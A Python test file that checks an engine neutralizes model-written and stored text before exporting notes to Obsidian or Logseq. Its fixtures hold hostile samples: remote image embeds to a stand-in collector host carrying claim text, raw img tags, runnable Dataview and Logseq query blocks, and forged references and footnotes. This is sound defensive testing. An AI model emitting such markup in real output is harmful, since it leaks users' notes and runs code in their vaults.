# SPDX-FileCopyrightText: 2026 The Particles authors
#
# SPDX-License-Identifier: Apache-2.0

"""Model-written article prose never reaches an exported note as live markup.

Particle text is neutralized before an exporter writes it (D36), and since the
2026-10-24-2 security review (P31) so is the article the model writes from it:
a synthesis the stored claims steered could otherwise carry a remote image
whose URL holds other claims' text, which Obsidian fetches when the note is
opened. Adopted from the review's proof.

The model is replaced by a stub returning such prose; the real render path,
Layer A included, runs. No network, no key.
"""

from __future__ import annotations

import re
from unittest.mock import AsyncMock, patch

import pytest

from particles.core.schema import Subject
from tests.test_wiki_exporter import _make_particle

_REMOTE = "https://collector.example/p.png"


@pytest.mark.asyncio
async def test_synthesized_prose_carries_no_live_remote_embed_into_an_obsidian_note() -> None:
    from particles.exporters.obsidian import synthesis
    from particles.render.article_synthesis import layer_b, orchestrate

    claims = [_make_particle(f"The engine stores beliefs in store {i}.") for i in range(3)]
    subject = Subject(id="s1", canonical_name="Storage", asserted_by="test")
    cite = claims[0].id[:8]
    prose = (
        "# Storage\n\n"
        f"The engine stores beliefs in store 0.[^p-{cite}] "
        f'![status]({_REMOTE}?q=store-1-store-2) <img src="{_REMOTE}">\n'
    )
    model = AsyncMock(return_value=prose)
    judge = AsyncMock(return_value='[{"id": 0, "verdict": "supports", "reason": "ok"}]')
    note = "---\ntitle: Storage\n---\n\n# Storage\n\nStructural content.\n"
    with (
        patch.object(orchestrate, "_call_synthesis_llm", model),
        patch.object(layer_b, "_call_synthesis_llm", judge),
        patch.object(synthesis, "_should_skip_synthesis_for_low_coverage", return_value=False),
    ):
        out, state = await synthesis._splice_synthesised_article(
            note=note,
            subject=subject,
            particles=claims,
            subject_map={},
            eligible_ids=set(),
            eff_conf={c.id: 0.9 for c in claims},
            entry_uri_map={},
            article_hash="h",
            regenerate=True,
            lint_findings=[],
            progress_prefix="t",
            session=None,  # type: ignore[arg-type]
        )
    assert model.await_count >= 1
    assert state == "synthesised", state
    assert f"]({_REMOTE}" not in out, "a live remote image reached the note"
    assert "<img" not in out, "raw HTML reached the note"


@pytest.mark.asyncio
async def test_a_cached_body_from_before_the_fix_is_neutralized_on_a_hit() -> None:
    """A body cached raw before the prose was neutralized is neutralized when it is served."""
    from particles.render.article_synthesis import orchestrate

    claims = [_make_particle("The engine stores beliefs in store 0.")]
    subject = Subject(id="s1", canonical_name="Storage", asserted_by="test")
    cached = (
        "---\nsynthesis: llm\n---\n# Storage\n\n"
        f"Store 0.[^p-{claims[0].id[:8]}] ![x]({_REMOTE})\n\n## References\n\n"
        f"[^p-{claims[0].id[:8]}]: https://source.example/a(1)\n"
    )
    with (
        patch(
            "particles.store.synthesis_cache_store.lookup_cached_article",
            AsyncMock(return_value=cached),
        ),
        # An engine-written row, not one an Obsidian export read back from a
        # vault (security review 2026-10-30-1, AB34).
        patch.object(orchestrate, "_read_back_from_a_vault", AsyncMock(return_value=False)),
    ):
        body, used = await orchestrate.render_article(
            subject=subject,
            particles=claims,
            eff={c.id: 0.9 for c in claims},
            input_hash="h",
            corpus_uris={},
            max_tokens=512,
            layer_b_enabled=False,
            session=object(),  # type: ignore[arg-type]
        )
    assert used is True
    assert f"]({_REMOTE}" not in body
    # The References section is the engine's, rebuilt from the cited particle,
    # not the one the cached body carried (security review 2026-10-28-2, AA30).
    assert f"[^p-{claims[0].id[:8]}]: " in body
    assert "https://source.example/a(1)" not in body


# Security review 2026-10-25-1, Q8 and Q37, adopted from the review's proofs:
# the pure render path, no store, no network, no model.

_REMOTE_IMAGE = re.compile(r"!\[[^\]]*\]\(https?://")


def _rendered(body: str) -> str:
    from particles.render.article_synthesis.render import render_synthesised_article
    from particles.render.article_synthesis.topic import SectionTopic

    return render_synthesised_article(
        SectionTopic(id="s", canonical_name="Storage"),
        [],
        body=body,
        cited_short_ids=set(),
        corpus_uris={},
        effective_confidences={},
        input_hash="0" * 16,
        layer_a_passed=True,
        layer_b_passed=True,
    )


_HOSTILE_REFERENCES = (
    "# Storage\n\n"
    "The engine keeps beliefs in SQLite [^p-abcd1234].\n\n"
    "## References\n\n"
    "![status](https://images.invalid/pixel.png)\n"
)


def test_a_references_heading_in_the_model_body_leaves_no_live_image() -> None:
    """Q8: no remote image the model wrote reaches the exported article as live markup."""
    from particles.render.article_synthesis.cache import neutralize_article_prose

    rendered = _rendered(_HOSTILE_REFERENCES)
    assert not _REMOTE_IMAGE.search(rendered), rendered
    assert not _REMOTE_IMAGE.search(neutralize_article_prose(rendered))


def test_only_the_engine_references_section_splits_the_article() -> None:
    """Q8: a References heading the model wrote is text, and the split finds the engine's."""
    from particles.render.article_synthesis.cache import split_rendered_article

    rendered = _rendered(_HOSTILE_REFERENCES)
    assert rendered.count("\n## References") == 1
    _fm, _h1, prose, references = split_rendered_article(rendered)
    assert "&#35;&#35; References" in prose and "pixel.png" in prose
    assert references == "## References"


def test_a_cached_body_with_a_model_references_heading_is_neutralized_past_it() -> None:
    """Q8: the cache-hit backstop escapes up to the engine's own (last) References heading."""
    from particles.render.article_synthesis.cache import neutralize_article_prose

    cached = (
        "---\nsynthesis: llm\n---\n# Storage\n\nStore 0.[^p-abcd1234]\n\n"
        "## References\n\n![x](https://images.invalid/p.png)\n\n"
        "## References\n\n[^p-abcd1234]: https://source.example/a(1)\n"
    )
    out = neutralize_article_prose(cached)
    assert not _REMOTE_IMAGE.search(out), out
    assert "https://source.example/a(1)" in out


def test_a_fenced_code_block_in_the_model_body_is_not_left_runnable() -> None:
    """Q37: a model-written Dataview JS block does not survive as a runnable fence."""
    from particles.render.article_synthesis.cache import neutralize_article_prose

    body = (
        "# Storage\n\n"
        "The engine keeps beliefs in SQLite [^p-abcd1234].\n\n"
        "```dataviewjs\n"
        "dv.paragraph('rendered by the vault plugin')\n"
        "```\n\n"
        "- ~~~dataviewjs\n"
        "  dv.paragraph('in a list item')\n"
        "  ~~~\n"
    )
    out = neutralize_article_prose(_rendered(body))
    assert "```" not in out and "~~~" not in out, out


# Security review 2026-10-25-2, R3, R27 and R45, adopted from the review's
# proofs: the pure render path and a stubbed model, no store, no network, no key.

# A ``<`` the D36 control backslash-escapes renders as the character, so only an
# unescaped one is live.
_LIVE_HTML = re.compile(r"(?<!\\)<(img|iframe|script|a|svg)\b", re.I)
_LIVE_FENCE = re.compile(r"^\s*(```|~~~)", re.M)


def test_model_prose_renders_no_heading_named_references() -> None:
    """R45: no setext or quoted heading of the model's prose reads as References."""
    from particles.render.article_synthesis.cache import split_rendered_article

    for body in (
        "# Storage\n\nSQLite [^p-abcd1234].\n\nReferences\n==========\n\nfake\n",
        "# Storage\n\nSQLite [^p-abcd1234].\n\nReferences\n---\n\nfake\n",
        "# Storage\n\nSQLite [^p-abcd1234].\n\n> ## References\n\nfake\n",
        "# Storage\n\nSQLite [^p-abcd1234].\n\n- > ### References\n\nfake\n",
    ):
        rendered = _rendered(body)
        _fm, _h1, prose, refs = split_rendered_article(rendered)
        assert refs == "## References"
        assert not re.search(r"(?mi)^references\n[=-]+\s*$", prose), prose
        assert not re.search(r"(?mi)^[>\s*+-]*#+[ \t]*references", prose), prose


def test_model_prose_carries_no_dataview_inline_query() -> None:
    """R27: a Dataview inline query (a code span opening on ``=``) in the body is not live."""
    from particles.render.markdown import neutralize_inline_markdown

    for query in ("`= [[Private]].secret`", "` = this.file.name `", "``= x``"):
        rendered = _rendered(f"# Storage\n\nSQLite [^p-abcd1234] {query}.\n")
        assert not re.search(r"`+[ \t]*=", rendered), rendered
        assert not re.search(r"`+[ \t]*=", neutralize_inline_markdown(query).replace("\\=", ""))
    # An ``=`` after a closed code span still reads as one.
    assert "`x` &#61; 5" in _rendered("# Storage\n\n`x` = 5 [^p-abcd1234].\n")


def test_model_prose_carries_no_logseq_query_block() -> None:
    """R27: a Logseq advanced query block in the body does not open."""
    from particles.render.markdown import neutralize_inline_markdown

    query = "#+BEGIN_QUERY\n{:query [:find ?b]}\n#+END_QUERY"
    rendered = _rendered(f"# Storage\n\nSQLite [^p-abcd1234].\n\n{query}\n")
    assert not re.search(r"(?i)#\+begin_", rendered), rendered
    assert not re.search(r"(?i)(?<!\\)#\+begin_", neutralize_inline_markdown(query))


def test_structured_listing_writes_no_live_markup_from_claim_text() -> None:
    """R3: the deterministic listing carries no live HTML or fence from stored text."""
    from particles.render.article_synthesis.render import render_structured_listing

    claim = _make_particle(
        'Storage note <img src="https://collector.invalid/p.png"> end.\n'
        "```dataviewjs\ndv.el('b','x')\n```"
    )
    subject = Subject(
        id="s1",
        canonical_name='Storage <img src="https://collector.invalid/n.png">',
        description="![d](https://collector.invalid/d.png)\n```js",
        asserted_by="test",
    )
    listing = render_structured_listing(subject, [claim], {claim.id: 0.9}, input_hash="0" * 16)
    assert not _LIVE_HTML.search(listing), listing
    assert not _LIVE_FENCE.search(listing), listing
    assert not _REMOTE_IMAGE.search(listing), listing


@pytest.mark.asyncio
async def test_obsidian_narrative_fallback_note_carries_no_live_markup() -> None:
    """R3: an Obsidian narrative note written from the fallback listing is inert."""
    from particles.exporters.obsidian.narrative import render_narrative_note
    from particles.render.article_synthesis import orchestrate
    from particles.render.markdown import SubjectNaming

    claims = [
        _make_particle('First step <img src="https://collector.invalid/p.png"> done.'),
        _make_particle("Second step done."),
    ]
    narrative = _make_particle("A narrative")
    # The model writes no citation, so Layer A fails twice and the fallback runs
    # (the same path a keyless engine or a failed call takes).
    model = AsyncMock(return_value="An uncited body.")
    with patch.object(orchestrate, "_call_synthesis_llm", model):
        note, state = await render_narrative_note(
            narrative=narrative,
            constituents=claims,
            subject_map={},
            eligible_ids=set(),
            eff_conf={c.id: 0.9 for c in claims},
            entry_uri_map={},
            naming=SubjectNaming({}, {}),
            article_hash="h",
            session=None,  # type: ignore[arg-type]
        )
    assert state == "fallback"
    assert not _LIVE_HTML.search(note), note


@pytest.mark.asyncio
async def test_logseq_narrative_fallback_page_carries_no_live_markup() -> None:
    """R3: a Logseq narrative page written from the fallback listing is inert."""
    from particles.exporters.logseq.narrative import render_narrative_page
    from particles.render.article_synthesis import orchestrate

    claims = [
        _make_particle('First step <img src="https://collector.invalid/p.png"> done.'),
        _make_particle("Second step done."),
    ]
    narrative = _make_particle("A narrative")
    model = AsyncMock(return_value="An uncited body.")
    with patch.object(orchestrate, "_call_synthesis_llm", model):
        page, state = await render_narrative_page(
            narrative=narrative,
            constituents=claims,
            entry_uri_map={},
            eff_conf={c.id: 0.9 for c in claims},
            article_hash="h",
            session=None,  # type: ignore[arg-type]
        )
    assert state == "fallback"
    assert not _LIVE_HTML.search(page), page


# ---------------------------------------------------------------------------
# Security review 2026-10-26-1: stored text in References lines and lint
# callouts (W46, the R3 residual), cached headings (W45) and footnote
# definitions (W42)
# ---------------------------------------------------------------------------

# An unescaped ``<`` opening a tag a vault renders (and fetches, for an image).
_LIVE_HTML = re.compile(r"(?<!\\)<(img|iframe|a|svg|video|audio)\b", re.I)
_HOSTILE = '<img src="https://collector.invalid/p.png">'


def _storage() -> Subject:
    return Subject(id="s1", canonical_name="Storage", asserted_by="test")


def test_listing_reference_line_attribution_is_inert() -> None:
    """The listing's References line writes a stored asserter and corpus id as inert text."""
    from particles.core.schema import ProvenanceRef, ProvenanceRefType
    from particles.render.article_synthesis.render import render_structured_listing

    claim = _make_particle("A plain claim.").model_copy(
        update={
            "extractor_ref": None,
            "asserted_by": f"importer {_HOSTILE}",
            "provenance": [
                ProvenanceRef(
                    type=ProvenanceRefType.SOURCE,
                    corpus_entry_id=f"e1` {_HOSTILE}",
                    snapshot_id=None,
                )
            ],
        }
    )
    listing = render_structured_listing(_storage(), [claim], {claim.id: 0.9}, input_hash="0" * 16)
    refs = listing.split("## References", 1)[1]
    # The corpus id stays inside its one code span, where markup is literal.
    span = re.search(r"corpus entry `([^`]*)`", refs)
    assert span is not None and span.group(1) == f"e1&#96; {_HOSTILE}", refs
    assert not _LIVE_HTML.search(refs.replace(span.group(0), "")), refs


def test_synthesised_reference_line_attribution_is_inert() -> None:
    """A synthesised article's References writes a stored asserter and URI as inert text."""
    from particles.render.article_synthesis.render import _short_id, render_synthesised_article

    claim = _make_particle("A plain claim.").model_copy(
        update={"extractor_ref": None, "asserted_by": f"importer {_HOSTILE}"}
    )
    entry = claim.provenance[0].corpus_entry_id
    sid = _short_id(claim.id)
    article = render_synthesised_article(
        _storage(),
        [claim],
        body=f"# Storage\n\nA plain claim [^p-{sid}].\n",
        cited_short_ids={sid},
        corpus_uris={entry: f"https://example.org/{_HOSTILE}"},
        effective_confidences={claim.id: 0.9},
        input_hash="0" * 16,
        layer_a_passed=True,
        layer_b_passed=None,
    )
    refs = article.rsplit("## References", 1)[1]
    assert not _LIVE_HTML.search(refs), refs


def test_lint_callout_detail_is_inert() -> None:
    """A lint finding's detail and action are spliced into the callout as inert lines."""
    from types import SimpleNamespace

    from particles.render.article_synthesis.render import apply_lint_callouts

    finding = SimpleNamespace(
        finding_type="CONTRADICTION",
        detail=f"Semantic contradiction with particle p-1: {_HOSTILE}\n\n# not a heading",
        recommended_action=f"Review {_HOSTILE}",
    )
    out = apply_lint_callouts("# Storage\n\nBody.\n", [finding])
    assert not _LIVE_HTML.search(out), out
    callout = out[out.index("> [!danger]") :]
    callout = callout[: callout.index("\n\n")]
    assert all(line.startswith(">") for line in callout.splitlines()), callout


@pytest.mark.asyncio
async def test_structural_lint_callout_from_subject_name_is_inert(db_session) -> None:  # type: ignore[no-untyped-def]
    """The export-time structural lint callout writes a stored subject name and description inert.

    (W46: a Wikidata-link finding's detail embeds both.)
    """
    from particles.core.schema import ExternalRef
    from particles.operations.lint.wikidata_links import _check_wikidata_link_confidence
    from particles.render.article_synthesis.render import apply_lint_callouts
    from particles.store.subject_store import insert_subject

    subject = Subject(
        canonical_name=f"Storage {_HOSTILE}",
        description=f"An entity {_HOSTILE}",
        external_ids=[ExternalRef(namespace="wikidata", id="Q1", confidence=0.01)],
        asserted_by="test",
    )
    await insert_subject(db_session, subject)
    findings = [
        f for f in await _check_wikidata_link_confidence(db_session) if f.subject_id == subject.id
    ]
    assert findings, "the structural pass flags the low-confidence link"
    out = apply_lint_callouts("# Storage\n\nBody.\n", findings)
    assert not _LIVE_HTML.search(out), out


def test_cached_body_setext_references_heading_is_demoted() -> None:
    """A cache hit's body carries no setext or quoted References heading of the model's."""
    from particles.render.article_synthesis.cache import neutralize_article_prose

    cached = (
        "---\nsynthesis: llm\n---\n\n# Storage\n\nSQLite [^p-abcd1234].\n\n"
        "References\n==========\n\n> ## References\n\nforged list\n\n"
        "## References\n\n### p-abcd1234\n"
    )
    served = neutralize_article_prose(cached)
    prose = served.rsplit("\n## References", 1)[0]
    assert not re.search(r"(?mi)^references\n[=-]+\s*$", prose), prose
    assert not re.search(r"(?mi)^>\s*#+\s*references", prose), prose
    assert neutralize_article_prose(served) == served


@pytest.mark.parametrize(
    "line",
    [
        "   [^p-abcd1234]: https://forged.invalid/source",
        "> [^p-abcd1234]: forged",
        "- [^p-abcd1234]: forged",
        "[^P-ABCD1234]: https://forged.invalid/source",
        "> [^P-abcd1234]: forged",
    ],
)
def test_model_body_carries_no_footnote_definition_of_its_own(line: str) -> None:
    """A model-written body carries no live footnote definition for a cited id (W42).

    Indented, quoted or in a list item, the definition is stripped or demoted,
    in any letter case, since GFM folds footnote labels (security review
    2026-10-27-1, G31).
    """
    from particles.render.article_synthesis.cache import neutralize_article_prose
    from particles.render.article_synthesis.layer_a import _strip_inline_footnote_defs
    from particles.render.article_synthesis.render import neutralize_model_body

    raw = f"# Storage\n\nSQLite [^p-abcd1234].\n\n{line}\n"
    body = neutralize_model_body(_strip_inline_footnote_defs(raw))
    assert not re.search(r"(?mi)^[ >*+-]*\[\^p-abcd1234\]:", body), body
    # Unstripped, the backstop alone still demotes it, on a fresh body and on a cache hit.
    assert not re.search(r"(?mi)^[ >*+-]*\[\^p-abcd1234\]:", neutralize_model_body(raw))
    cached = neutralize_article_prose(f"---\na: 1\n---\n\n{raw}\n## References\n\n")
    assert not re.search(r"(?mi)^[ >*+-]*\[\^p-abcd1234\]:", cached.split("## References")[0])
